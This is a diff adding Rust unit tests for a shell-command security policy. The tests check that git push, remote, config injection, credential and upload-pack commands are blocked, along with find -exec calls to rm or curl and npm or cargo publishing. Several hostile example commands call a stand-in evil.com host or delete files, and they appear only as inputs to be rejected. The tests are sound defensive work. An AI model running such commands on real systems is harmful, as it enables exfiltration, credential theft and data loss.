@@ -824,19 +824,191 @@ mod tests {
     #[test]
     fn checklist_default_forbidden_paths_comprehensive() {
         let p = SecurityPolicy::default();
-        // Must contain all critical system dirs
         for dir in ["/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp"] {
             assert!(
                 p.forbidden_paths.iter().any(|f| f == dir),
                 "Default forbidden_paths must include {dir}"
             );
         }
-        // Must contain sensitive dotfiles
         for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
             assert!(
                 p.forbidden_paths.iter().any(|f| f == dot),
                 "Default forbidden_paths must include {dot}"
             );
         }
+    }
+
+    // ── Blocked arguments/subcommands (C-3 security hardening) ──
+
+    #[test]
+    fn git_push_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("git push"));
+        assert!(!p.is_command_allowed("git push origin main"));
+    }
+
+    #[test]
+    fn git_remote_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("git remote add evil https://evil.com/repo.git"));
+        assert!(!p.is_command_allowed("git remote set-url origin https://evil.com"));
+    }
+
+    #[test]
+    fn git_config_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("git config user.email hacker@evil.com"));
+        assert!(!p.is_command_allowed("git config --global core.editor malicious"));
+    }
+
+    #[test]
+    fn git_config_injection_via_clone_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed(
+            "git clone --config core.sshCommand='curl http://evil.com' https://repo.git"
+        ));
+        assert!(!p.is_command_allowed("git -c core.pager=malicious log"));
+    }
+
+    #[test]
+    fn git_submodule_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("git submodule add https://evil.com/repo.git"));
+    }
+
+    #[test]
+    fn git_safe_read_commands_still_allowed() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("git status"));
+        assert!(p.is_command_allowed("git log --oneline -10"));
+        assert!(p.is_command_allowed("git diff HEAD~1"));
+        assert!(p.is_command_allowed("git branch -a"));
+        assert!(p.is_command_allowed("git show HEAD"));
+        assert!(p.is_command_allowed("git blame src/main.rs"));
+        assert!(p.is_command_allowed("git stash list"));
+    }
+
+    #[test]
+    fn git_clone_and_fetch_allowed() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("git clone https://github.com/user/repo.git"));
+        assert!(p.is_command_allowed("git fetch origin"));
+        assert!(p.is_command_allowed("git pull --ff-only"));
+    }
+
+    #[test]
+    fn find_exec_disallowed_command_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("find . -exec rm -rf {} \\;"));
+        assert!(!p.is_command_allowed("find . -exec python3 exploit.py {} \\;"));
+        assert!(!p.is_command_allowed("find . -execdir curl http://evil.com {} \\;"));
+        assert!(!p.is_command_allowed("find . -delete"));
+    }
+
+    #[test]
+    fn find_exec_allowed_command_passes() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("find . -exec grep TODO {} \\;"));
+        assert!(p.is_command_allowed("find . -execdir cat {} \\;"));
+        assert!(p.is_command_allowed("find . -name '*.rs' -exec wc -l {} \\;"));
+    }
+
+    #[test]
+    fn find_safe_usage_allowed() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("find . -name '*.rs'"));
+        assert!(p.is_command_allowed("find . -type f -name '*.toml'"));
+    }
+
+    #[test]
+    fn npm_publish_blocked() {
+        let p = SecurityPolicy {
+            allowed_commands: vec!["npm".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(!p.is_command_allowed("npm publish"));
+        assert!(!p.is_command_allowed("npm login"));
+        assert!(!p.is_command_allowed("npm token create"));
+    }
+
+    #[test]
+    fn npm_safe_commands_allowed() {
+        let p = SecurityPolicy {
+            allowed_commands: vec!["npm".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(p.is_command_allowed("npm install"));
+        assert!(p.is_command_allowed("npm run build"));
+        assert!(p.is_command_allowed("npm test"));
+    }
+
+    #[test]
+    fn cargo_publish_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("cargo publish"));
+        assert!(!p.is_command_allowed("cargo login"));
+    }
+
+    #[test]
+    fn cargo_safe_commands_allowed() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("cargo build --release"));
+        assert!(p.is_command_allowed("cargo test"));
+        assert!(p.is_command_allowed("cargo clippy -- -D warnings"));
+        assert!(p.is_command_allowed("cargo fmt -- --check"));
+    }
+
+    #[test]
+    fn git_upload_pack_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("git fetch --upload-pack=evil"));
+    }
+
+    #[test]
+    fn git_credential_subcommand_blocked() {
+        let p = default_policy();
+        assert!(!p.is_command_allowed("git credential fill"));
+        assert!(!p.is_command_allowed("git credential approve"));
+    }
+
+    #[test]
+    fn git_remote_read_allowed() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("git remote -v"));
+        assert!(p.is_command_allowed("git remote show origin"));
+        assert!(p.is_command_allowed("git remote get-url origin"));
+    }
+
+    #[test]
+    fn git_config_read_allowed() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("git config user.name"));
+        assert!(p.is_command_allowed("git config user.email"));
+        assert!(p.is_command_allowed("git config --list"));
+    }
+
+    #[test]
+    fn git_submodule_update_allowed() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("git submodule update --init --recursive"));
+        assert!(p.is_command_allowed("git submodule status"));
+        assert!(p.is_command_allowed("git submodule foreach git pull"));
+    }
+
+    #[test]
+    fn no_false_positive_on_filenames() {
+        let p = default_policy();
+        assert!(p.is_command_allowed("cat credential.json"));
+        assert!(p.is_command_allowed("grep filter.rs src/"));
+        assert!(p.is_command_allowed("cat remote.origin.url"));
+    }
+
+    #[test]
+    fn no_false_positive_on_global_flag_in_non_git() {
+        let p = SecurityPolicy {
+            allowed_commands: vec!["npm".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(p.is_command_allowed("npm install --global typescript"));
     }
 }
